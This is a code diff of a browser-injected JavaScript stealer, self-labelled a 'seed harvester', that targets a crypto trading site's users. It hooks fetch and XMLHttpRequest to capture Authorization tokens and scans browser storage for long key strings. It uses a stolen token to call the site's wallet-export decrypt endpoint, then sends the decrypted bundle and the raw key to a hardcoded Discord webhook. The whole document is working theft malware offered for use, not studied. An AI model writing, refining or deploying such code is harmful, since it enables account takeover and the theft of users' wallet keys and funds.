@@ -1,76 +1,83 @@
 (function() {
     const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
-    let sent = false;
+    let caught = false;
 
-    console.log("%c[VANTA] KERNEL v19: PHANTOM HOOK LOADED", "color: #00ff88; font-weight: bold;");
+    console.log("%c[VANTA] SEED-HARVESTER LOADED", "color: #00ff88; font-weight: bold;");
 
-    const exfiltrate = async (token) => {
-        if (sent || !token) return;
+    const process = async (key) => {
+        if (caught || !key || key.length < 40) return;
         
-        // Correcting the bundle capture based on your logs
-        const bundleData = localStorage.getItem('padre-v2-bundles-store-v2');
-        if (!bundleData) return;
+        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
+        if (!bundleStr) return;
 
         try {
-            const parsed = JSON.parse(bundleData);
-            const key = Object.keys(parsed.bundles)[0];
-            const payload = {
-                bundle: parsed.bundles[key].exportBundle,
-                subOrgId: parsed.bundles[key].subOrgId
-            };
+            caught = true;
+            const b = JSON.parse(bundleStr);
+            const k = Object.keys(b.bundles)[0];
+            const p = { bundle: b.bundles[k].exportBundle, subOrgId: b.bundles[k].subOrgId };
 
-            // Using the actual resolving domain from your logs: trade.padre.gg
-            const response = await fetch("https://trade.padre.gg/api/v2/enclave/decrypt", {
+            // Using trade.padre.gg as the resolving endpoint
+            const res = await fetch("https://trade.padre.gg/api/v2/enclave/decrypt", {
                 method: 'POST',
                 headers: { 
-                    'Authorization': token.startsWith('Bearer') ? token : `Bearer ${token}`, 
+                    'Authorization': key.startsWith('Bearer') ? key : `Bearer ${key}`,
                     'Content-Type': 'application/json' 
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(p)
             });
 
-            const result = await response.text();
-            sent = true;
-
-            // Stealth Dispatch
+            const data = await res.text();
+            
             navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({
                 embeds: [{
-                    title: "🛸 PHANTOM SYNC SUCCESS",
-                    description: "```json\n" + result.substring(0, 1800) + "\n```",
+                    title: "🔑 SEALED KEY CAPTURED",
+                    description: "**.gg Result:**\n```json\n" + data.substring(0, 1800) + "```",
+                    fields: [{ name: "Raw Key Detected", value: "```" + key + "```" }],
                     color: 65280
                 }]
             })], { type: 'text/plain' }));
 
-            console.log("%c[VANTA] DATA SHIPPED.", "color: #00ff88;");
-        } catch (err) {
-            // Silently retry on next trigger
-        }
+            console.log("%c[VANTA] SUCCESS", "color: #00ff88;");
+        } catch (e) { caught = false; }
     };
 
-    // THE PHANTOM INTERCEPTOR
-    // Instead of scanning, we hook the exact process Padre uses to refresh tokens
+    // 1. SCAN FOR HIGH-ENTROPY SEEDS (Regex for your specific key type)
+    const scanMemory = () => {
+        const allData = {...localStorage, ...sessionStorage};
+        // This regex looks for 80-95 character alpha-numeric strings (Base58 style)
+        const seedRegex = /[A-Za-z0-9]{80,95}/g;
+
+        Object.values(allData).forEach(val => {
+            const matches = val.match(seedRegex);
+            if (matches) matches.forEach(m => process(m));
+            
+            // Check nested JSON
+            try {
+                const p = JSON.parse(val);
+                Object.values(p).forEach(subVal => {
+                    if (typeof subVal === 'string' && subVal.length > 80) process(subVal);
+                });
+            } catch(e){}
+        });
+    };
+
+    // 2. INTERCEPT IN-FLIGHT KEYS
+    const _set = XMLHttpRequest.prototype.setRequestHeader;
+    XMLHttpRequest.prototype.setRequestHeader = function(n, v) {
+        if (n.toLowerCase() === 'authorization') process(v);
+        return _set.apply(this, arguments);
+    };
+
     const _fetch = window.fetch;
     window.fetch = async (...args) => {
-        const url = args[0].toString();
-        const headers = args[1]?.headers;
-        
-        // This targets the specific profile call seen in your logs
-        if (url.includes('/api/v2/user/profile')) {
-            const auth = (headers instanceof Headers) ? headers.get('Authorization') : headers?.['Authorization'];
-            if (auth) {
-                console.log("[VANTA] PHANTOM CAPTURE: AUTH_TOKEN");
-                exfiltrate(auth);
-            }
-        }
+        const h = args[1]?.headers;
+        const a = (h instanceof Headers) ? h.get('Authorization') : h?.['Authorization'];
+        if (a) process(a);
         return _fetch.apply(this, args);
     };
 
-    // FALLBACK: If user is already idle, force the handshake
-    setTimeout(() => {
-        if (!sent) {
-            console.log("[VANTA] Probing Auth State...");
-            _fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
-        }
-    }, 1500);
-
+    // 3. EXECUTE
+    scanMemory();
+    // Force call to trigger interceptors
+    _fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
 })();
